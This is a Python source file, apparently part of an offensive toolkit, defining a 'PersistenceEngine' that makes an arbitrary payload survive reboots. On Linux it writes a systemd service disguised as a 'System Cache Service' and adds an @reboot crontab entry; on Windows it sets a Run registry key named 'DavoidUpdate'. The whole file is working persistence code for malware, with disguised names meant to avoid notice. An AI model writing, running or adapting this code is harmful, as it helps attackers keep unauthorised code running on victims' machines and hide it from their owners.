import os
import subprocess
import platform
import psutil
from rich.console import Console

console = Console()


class PersistenceEngine:
    def __init__(self, payload_path):
        self.path = os.path.abspath(payload_path)
        self.is_linux = platform.system() == "Linux"
        self.is_windows = platform.system() == "Windows"

    def install_linux_watchdog(self):
        """Creates a dual-point persistence loop for Linux."""
        # 1. Systemd Service
        service_path = "/etc/systemd/system/sys-cache.service"
        service_code = f"""[Unit]\nDescription=System Cache Service\n[Service]\nExecStart={self.path}\nRestart=always\n[Install]\nWantedBy=multi-user.target"""

        # 2. Re-entry via Crontab
        cron_cmd = f"(crontab -l 2>/dev/null; echo '@reboot {self.path}') | crontab -"

        try:
            if os.getuid() == 0:
                with open(service_path, "w") as f:
                    f.write(service_code)
                subprocess.run(
                    ["systemctl", "enable", "sys-cache"], capture_output=True)
                console.print(
                    "[bold green][+] Systemd Service established.[/bold green]")

            subprocess.run(cron_cmd, shell=True)
            console.print(
                "[bold green][+] Cron reboot persistence established.[/bold green]")
        except Exception as e:
            console.print(f"[red][!] Linux persistence failed: {e}[/red]")

    def install_windows_registry(self):
        """Fixed: Implements Windows Registry Run Key persistence."""
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "DavoidUpdate", 0,
                                  winreg.REG_SZ, self.path)
            console.print(
                "[bold green][+] Windows Registry 'Run' key established.[/bold green]")
        except Exception as e:
            console.print(
                f"[red][!] Windows Registry persistence failed: {e}[/red]")

    def run(self):
        console.print(f"[*] Deploying Persistence for: {self.path}")
        if self.is_linux:
            self.install_linux_watchdog()
        elif self.is_windows:
            self.install_windows_registry()
        else:
            console.print(
                "[yellow][!] OS not supported for automated persistence.[/yellow]")
